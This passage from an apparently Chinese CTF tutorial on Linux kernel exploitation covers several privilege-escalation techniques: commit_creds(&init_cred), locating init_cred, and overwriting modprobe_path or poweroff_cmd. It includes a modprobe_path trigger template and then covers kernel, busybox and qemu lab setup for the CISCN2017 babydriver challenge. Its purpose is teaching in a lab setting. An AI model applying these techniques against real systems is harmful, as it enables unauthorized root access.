<p>另外 <code>init_cred</code> 是在内核当中有一个特殊的 <code>cred</code> ，它是 <code>init</code> 进程的 <code>cred</code> ，因此其权限为 root ，且该 <code>cred</code> 并非是动态分配的，因此当我们泄露出内核基址之后我们也便能够获得 <code>init_cred</code> 的地址，那么我们就只需要执行一次 <code>commit_creds(&amp;init_cred)</code> 便能完成提权，不过有些内核中没有 <code>init_cred</code>（实际上多数情况是由于缺少符号找不到 <code>init_cred</code>，因此需要逆向分析 <code>prepare_kernel_cred</code> 函数来定位 <code>init_cred</code>）。不过自从内核版本 <code>6.2</code> 起，<code>prepare_kernel_cred(NULL)</code> 将不再拷贝 <code>init_cred</code>，而是将其视为一个运行时错误并返回 <code>NULL</code>，这使得这种提权方法无法再应用于 <code>6.2</code> 及更高版本的内核：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">cred</span> *<span class="built_in">prepare_kernel_cred</span>(<span class="keyword">struct</span> task_struct *daemon)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">cred</span> *old;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">cred</span> *<span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WARN_ON_ONCE</span>(!daemon))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> = <span class="built_in">kmem_cache_alloc</span>(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="commit-creds-init-cred"><a href="#commit-creds-init-cred" class="headerlink" title="commit_creds(&amp;init_cred)"></a>commit_creds(&amp;init_cred)</h3><p>在内核初始化过程当中会以 root 权限启动 <code>init</code> 进程，其 cred 结构体为<strong>静态定义</strong>的 <code>init_cred</code>，由此不难想到的是我们可以通过 <code>commit_creds(&amp;init_cred)</code> 来完成提权的工作</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The initial credentials for the initial task</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> &#123;</span><br><span class="line">    .usage          = ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    .subscribers        = ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">    .magic          = CRED_MAGIC,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    .uid            = GLOBAL_ROOT_UID,</span><br><span class="line">    .gid            = GLOBAL_ROOT_GID,</span><br><span class="line">    .suid           = GLOBAL_ROOT_UID,</span><br><span class="line">    .sgid           = GLOBAL_ROOT_GID,</span><br><span class="line">    .euid           = GLOBAL_ROOT_UID,</span><br><span class="line">    .egid           = GLOBAL_ROOT_GID,</span><br><span class="line">    .fsuid          = GLOBAL_ROOT_UID,</span><br><span class="line">    .fsgid          = GLOBAL_ROOT_GID,</span><br><span class="line">    .securebits     = SECUREBITS_DEFAULT,</span><br><span class="line">    .cap_inheritable    = CAP_EMPTY_SET,</span><br><span class="line">    .cap_permitted      = CAP_FULL_SET,</span><br><span class="line">    .cap_effective      = CAP_FULL_SET,</span><br><span class="line">    .cap_bset       = CAP_FULL_SET,</span><br><span class="line">    .user           = INIT_USER,</span><br><span class="line">    .user_ns        = &amp;init_user_ns,</span><br><span class="line">    .group_info     = &amp;init_groups,</span><br><span class="line">    .ucounts        = &amp;init_ucounts,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h4 id="init-cred-定位"><a href="#init-cred-定位" class="headerlink" title="init_cred 定位"></a>init_cred 定位</h4><p>init_cred 是在内核当中有一个特殊的 cred ，它是 init 进程的 cred ，因此其权限为 root ，且该 cred 并非是动态分配的，因此当我们泄露出内核基址之后我们也便能够获得 init_cred 的地址，那么我们就只需要执行一次 commit_creds(&amp;init_cred) 便能完成提权，不过有些内核中没有 init_cred（实际上多数情况是由于缺少符号找不到 init_cred，因此需要逆向分析 prepare_kernel_cred 函数来定位 init_cred）。根据不同内核源码，确定init_cred位置即可。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">prepare_kernel_cred</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> *task_cred; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  v1 = (_DWORD *)kmem_cache_alloc(qword_FFFFFFFF82735900, <span class="number">20971712LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    task_cred = (<span class="type">int</span> *)get_task_cred(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _InterlockedIncrement(dword_FFFFFFFF8223D1A0);</span><br><span class="line">    task_cred = dword_FFFFFFFF8223D1A0; <span class="comment">// init_cred</span></span><br><span class="line">  &#125;</span><br><span class="line">  qmemcpy(v1, task_cred, <span class="number">0xA8</span>uLL);</span><br><span class="line">  *v1 = <span class="number">1</span>;</span><br><span class="line">  _InterlockedIncrement(*((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 **)v1 + <span class="number">16</span>));</span><br><span class="line">  _InterlockedIncrement(*((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 **)v1 + <span class="number">18</span>));</span><br><span class="line">  *((_QWORD *)v1 + <span class="number">11</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *((_QWORD *)v1 + <span class="number">12</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *((_QWORD *)v1 + <span class="number">13</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *((_QWORD *)v1 + <span class="number">14</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *((_BYTE *)v1 + <span class="number">80</span>) = <span class="number">1</span>;</span><br><span class="line">  *((_QWORD *)v1 + <span class="number">15</span>) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)security_prepare_creds(v1, task_cred, <span class="number">20971712LL</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !_InterlockedDecrement(v1) )</span><br><span class="line">      _put_cred(v1);</span><br><span class="line">    <span class="keyword">if</span> ( _InterlockedDecrement(task_cred) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    _put_cred(task_cred);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !_InterlockedDecrement(task_cred) )</span><br><span class="line">    _put_cred(task_cred);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="符号链接"><a href="#符号链接" class="headerlink" title="符号链接"></a>符号链接</h3><p>如果一个 root 权限的进程会执行一个符号链接的程序，并且该符号链接或者符号链接指向的程序可以由攻击者控制，攻击者就可以实现提权。</p>
<h3 id="call-usermodehelper"><a href="#call-usermodehelper" class="headerlink" title="call_usermodehelper"></a>call_usermodehelper</h3><p><code>call_usermodehelper</code> 是一种内核线程执行用户态应用的方式，并且启动的进程具有 root 权限。因此，如果我们能够控制具体要执行的应用，那就可以实现提权。在内核中，<code>call_usermodehelper</code> 具体要执行的应用往往是由某个变量指定的，因此我们只需要想办法修改掉这个变量即可。不难看出，这是一种典型的数据流攻击方法。一般常用的主要有以下几种方式。</p>
<h4 id="修改-modprobe-path"><a href="#修改-modprobe-path" class="headerlink" title="修改 modprobe_path"></a>修改 modprobe_path</h4><p>修改 modprobe_path 实现提权的基本流程如下</p>
<ol>
<li>获取 modprobe_path 的地址。</li>
<li>修改 modprobe_path 为指定的程序。</li>
<li>触发执行 <code>call_modprobe</code>，从而实现提权 。这里我们可以利用以下几种方式来触发<ol>
<li>执行一个非法的可执行文件。非法的可执行文件需要满足相应的要求。</li>
<li>使用未知协议来触发。</li>
</ol>
</li>
</ol>
<p>这里我们也给出使用 modprobe_path 的模板。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// step 1. modify modprobe_path to the target value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// step 2. create related file</span></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag&#x27; &gt; /home/pwn/catflag.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/catflag.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3. trigger it using unknown executable</span></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3. trigger it using unknown protocol</span></span><br><span class="line">socket(AF_INET,SOCK_STREAM,<span class="number">132</span>);</span><br></pre></td></tr></table></figure></div>

<p>在这个过程中，我们着重关注下如何定位 modprobe_path。</p>
<h5 id="直接定位"><a href="#直接定位" class="headerlink" title="直接定位"></a>直接定位</h5><p>由于 modprobe_path 的取值是确定的，所以我们可以直接扫描内存，寻找对应的字符串。这需要我们具有扫描内存的能力。</p>
<h5 id="间接定位"><a href="#间接定位" class="headerlink" title="间接定位"></a>间接定位</h5><p>考虑到 modprobe_path 相对于内核基地址的偏移是固定的，我们可以先获取到内核的基地址，然后根据相对偏移来得到 modprobe_path 的地址。</p>
<p><strong>call_usermodehelper用法</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kmod.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">call_usermodehelper_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	char path[] = &quot;/bin/mkdir&quot;;</span></span><br><span class="line"><span class="comment">	char *argv[] = &#123;path, &quot;-p&quot;, &quot;/home/tester/new/new_dir&quot;, NULL&#125;;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="type">char</span> path[] = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">	<span class="type">char</span> *argv[] = &#123;path, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-la&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;/home/tester/ls_output&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">	<span class="type">char</span> *envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">	printk(<span class="string">&quot;call_usermodehelper module is starting..!\n&quot;</span>);</span><br><span class="line">	ret = call_usermodehelper(path, argv, envp, UMH_WAIT_PROC);</span><br><span class="line">	printk(<span class="string">&quot;ret=%d\n&quot;</span>, ret);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">call_usermodehelper_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">	<span class="type">char</span> path[] = <span class="string">&quot;/bin/rm&quot;</span>;</span><br><span class="line">	<span class="type">char</span> *argv[] = &#123;path, <span class="string">&quot;-r&quot;</span>, <span class="string">&quot;/home/tester/new/new_dir&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">	<span class="type">char</span> *envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">	printk(<span class="string">&quot;call_usermodehelper module is starting..!\n&quot;</span>);</span><br><span class="line">	ret = call_usermodehelper(path, argv, envp, UMH_WAIT_PROC);</span><br><span class="line">	printk(<span class="string">&quot;ret=%d\n&quot;</span>, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(call_usermodehelper_init);</span><br><span class="line">module_exit(call_usermodehelper_exit);</span><br></pre></td></tr></table></figure></div>

<h4 id="修改-poweroff-cmd"><a href="#修改-poweroff-cmd" class="headerlink" title="修改 poweroff_cmd"></a>修改 poweroff_cmd</h4><ol>
<li>修改 poweroff_cmd 为指定的程序。</li>
<li>劫持控制流执行 <code>__orderly_poweroff</code>。</li>
</ol>
<p>关于如何定位 poweroff_cmd，我们可以采用类似于定位 <code>modprobe_path</code> 的方法。</p>
<h3 id="早期的内核"><a href="#早期的内核" class="headerlink" title="早期的内核"></a>早期的内核</h3><p>在早期的时候还有像 <code>kernel null pointer dereference</code> 和 修改 vDSO 段内函数代码为shellcode这样的操作，感兴趣可以查询相关资料，这里就不做介绍了。</p>
<h2 id="ioctl-系统调用"><a href="#ioctl-系统调用" class="headerlink" title="ioctl 系统调用"></a>ioctl 系统调用</h2><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/coolwriter/article/details/78242256" >参考链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>在<code>Linux</code>中一切都可以被视为文件，因为一切都可以访问文件的方式进行操作，<code>Linux</code>定义了系统调用<code>ioctl</code>供进程与设备之间进行通信，系统调用<code>ioctl</code>是一个用于设备输入输出操作的一个系统调用，调用方式如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> request, ...)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>fd</code>：设备的文件描述符</li>
<li><code>request</code>：请求码</li>
<li>其他参数</li>
</ul>
<p>对于一个提供了 <code>ioctl</code> 通信方式的设备而言，我们可以通过其文件描述符、使用不同的请求码及其他请求参数通过 <code>ioctl</code> 系统调用完成不同的对设备的 <code>I/O</code> 操作。一些没办法归类的函数就统一放在 <code>ioctl</code> 这个函数操作中，通过指定的命令来实现对应的操作。所以，ioctl函数里面都实现了多个的对硬件的操作，通过应用层传入的命令来调用相应的操作。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="内核编译-可选"><a href="#内核编译-可选" class="headerlink" title="内核编译 (可选)"></a>内核编译 (可选)</h3><p><a class="link"   target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/kernel/" >清华源<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<ol>
<li><strong><code>make menuconfig</code></strong></li>
</ol>
<p>这里我们主要关注调试方面的选项，依次进入到 <code>Kernel hacking -&gt; Compile-time checks and compiler options</code>，然后勾选如下选项<code>Compile the kernel with debug info</code>，以便于调试。不过似乎现在是默认开启的。如果要使用 <code>kgdb</code> 调试内核，则需要选中 <code>KGDB: kernel debugger</code>，并选中 <code>KGDB</code> 下的所有选项。</p>
<blockquote>
<p>报错处理：</p>
<p>【1】</p>
<p>问题概述：</p>
<p><code>make[1]: *** No rule to make target &#39;debian/canonical-certs.pem&#39;, needed by &#39;certs/x509_certificate_list&#39;.  Stop. make: *** [Makefile:1868: certs] Error 2</code></p>
<p>解决方法：</p>
<p>编辑 <code>.config</code> 文件，搜索<code>debian/canonical-certs.pem</code>并把这个字符串删掉。</p>
<p>删除前：</p>
<ul>
<li>CONFIG_SYSTEM_TRUSTED_KEYS&#x3D;”debian&#x2F;canonical-certs.pem”</li>
</ul>
<p>删除后</p>
<ul>
<li>CONFIG_SYSTEM_TRUSTED_KEYS&#x3D;””</li>
</ul>
</blockquote>
<ol start="2">
<li><strong><code>make bzImage -j4</code></strong></li>
</ol>
<blockquote>
<p>注意事项：</p>
<p>注意 gcc 版本问题，<code>4.*</code>一般用 <code>gcc-5</code>，<code>5.*</code>一般用 <code>gcc-7</code>。</p>
<p>gcc多版本共存请参考<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/wr1997/article/details/107737706" >这里<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<ol start="3">
<li><strong>编译成功后</strong></li>
</ol>
<p>我们一般主要关注于如下的文件</p>
<ul>
<li><strong>bzImage：</strong><code>arch/x86/boot/bzImage</code></li>
<li><strong>vmlinux：</strong>源码所在的根目录下。</li>
</ul>
<p>此外，这里给出常见内核文件的介绍。</p>
<ul>
<li><strong>bzImage</strong>：目前主流的 kernel  镜像格式，即 big zImage（即 bz 不是指 bzip2），适用于较大的（大于 512 KB）  Kernel。这个镜像会被加载到内存的高地址，高于 1MB。bzImage 是用 gzip 压缩的，文件的开头部分有 gzip  解压缩的代码，所以我们不能用 gunzip 来解压缩。</li>
<li><strong>zImage</strong>：比较老的 kernel 镜像格式，适用于较小的（不大于 512KB） Kernel。启动时，这个镜像会被加载到内存的低地址，即内存的前 640 KB。zImage 也不能用 gunzip 来解压缩。</li>
<li><strong>vmlinuz</strong>：vmlinuz 不仅包含了压缩后的 vmlinux，还包含了 gzip 解压缩的代码。实际上就是 zImage 或者 bzImage 文件。该文件是  bootable 的。 bootable 是指它能够把内核加载到内存中。对于 Linux 系统而言，该文件位于 &#x2F;boot  目录下。该目录包含了启动系统时所需要的文件。</li>
<li><strong>vmlinux</strong>：静态链接的 Linux kernel，以可执行文件的形式存在，尚未经过压缩。该文件往往是在生成 vmlinuz 的过程中产生的。该文件适合于调试。但是该文件不是 bootable 的。</li>
<li><strong>vmlinux.bin</strong>：也是静态链接的 Linux kernel，只是以一个可启动的 (bootable) 二进制文件存在。所有的符号信息和重定位信息都被删除了。生成命令为：<code>objcopy -O binary vmlinux vmlinux.bin</code>。</li>
<li><strong>uImage</strong>：uImage 是 U-boot 专用的镜像文件，它是在 zImage 之前加上了一个长度为 0x40 的 tag 而构成的。这个 tag 说明了这个镜像文件的类型、加载位置、生成时间、大小等信息。</li>
</ul>
<h3 id="编译-busybox-可选"><a href="#编译-busybox-可选" class="headerlink" title="编译 busybox (可选)"></a>编译 busybox (可选)</h3><p>可以在 <a class="link"   target="_blank" rel="noopener" href="https://busybox.net/" >busybox官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 下载源码解压安装。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//busybox.net/downloads/busybox-1.36.1.tar.bz2</span></span><br><span class="line">tar -jxvf busybox<span class="number">-1.36</span><span class="number">.1</span>.tar.bz2</span><br></pre></td></tr></table></figure></div>

<p><strong>make menuconfig</strong></p>
<ol>
<li>进入 <code>setting</code> 选择静态编译。</li>
<li>设置安装目录(<code>Destination path for &#39;make install&#39;</code>)，可以默认也可以改为 <code>./rootfs</code></li>
</ol>
<p><strong>make -j4 &amp;&amp; make install</strong></p>
<p>源目录下的 <code>rootfs</code> 文件夹里便是我们编译好的文件系统。</p>
<h3 id="Kernel-Pwn-一般流程"><a href="#Kernel-Pwn-一般流程" class="headerlink" title="Kernel Pwn 一般流程"></a>Kernel Pwn 一般流程</h3><p>我们拿 <a class="link"   target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver" >CISCN2017-babykernel<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这道题为例。</p>
<h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><p>解压后有三个文件：</p>
<ul>
<li><code>boot.sh</code>：启动脚本；</li>
<li><code>bzImage</code>：内核镜像；</li>
<li><code>rootfs.cpio</code>：文件系统；</li>
</ul>
<p><strong>启动脚本</strong></p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; \</span><br><span class="line">  -enable-kvm \</span><br><span class="line">  -monitor /dev/null -m 64M \</span><br><span class="line">  --nographic \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  -cpu kvm64,+smep</span><br></pre></td></tr></table></figure></div>

<p>在用 <code>qemu</code> 启动内核时，常用的选项如下</p>
<ul>
<li><code>-m</code>， 指定 RAM 大小，默认 384M</li>
<li><code>-kernel</code>，指定内核镜像文件 bzImage 路径</li>
<li><code>-initrd</code>，设置内核启动的内存文件系统</li>
<li><code>-smp [cpus=]n[,cores=cores][,threads=threads][,dies=dies][,sockets=sockets][,maxcpus=maxcpus]</code>，指定使用到的核数。</li>
<li><code>-cpu</code>，指定指定要模拟的处理器架构，可以同时开启一些保护，如   <ul>
<li><code>+smap</code>，开启 smap 保护</li>
<li><code>+smep</code>，开启 smep 保护</li>
</ul>
</li>
<li><code>-nographic</code>，表示不需要图形界面</li>
<li><code>-monitor</code>，对 qemu 提供的控制台进行重定向，如果没有设置的话，可以直接进入控制台。<code>-monitor /dev/null</code> 后 <code>Ctrl + c</code> 可以直接退出 qemu 。</li>
<li><code>-append</code>，附加选项   <ul>
<li><code>nokaslr</code> 关闭随机偏移</li>
<li><code>pti=on/off</code> 开启&#x2F;关闭 KPTI</li>
<li><code>console=ttyS0</code>，和 <code>nographic</code> 一起使用，启动的界面就变成了当前终端。</li>
</ul>
</li>
</ul>
<p>安装 <code>qemu</code> 后运行 <code>boot.sh</code> 即可启动 <code>linux</code> 系统。</p>
<p><strong>内核镜像</strong></p>
<p><code>bzImage</code> 便是我们上面提到的内核镜像，可以用 <code>file</code> 检查内核版本。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file bzImage</span> </span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0X6, Normal VGA</span><br></pre></td></tr></table></figure></div>

<p><strong>文件系统</strong></p>
<p>启动的文件系统，可以通过 <code>cpio</code> 进行解压（<code>cpio -idmv &lt; rootfs.cpio</code>），不过有的题目可能会把一些其它压缩格式的文件系统后缀改成 <code>cpio</code>。可以选择右击然后<code>Extract Here</code>。有时右键解压的文件系统会导致内核启动不了，目前用 <code>binwalk -e</code> 解压的是没问题的 。</p>
<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p><strong>分析init文件</strong></p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure></div>

<p><code>init</code> 是 linux 启动时的初始化文件，主要做一些环境配置。通过分析 <code>init</code> 文件可以获取一些重要信息，另外可以通过修改 <code>init</code> 文件增加调试分析的便捷性。</p>
<ul>
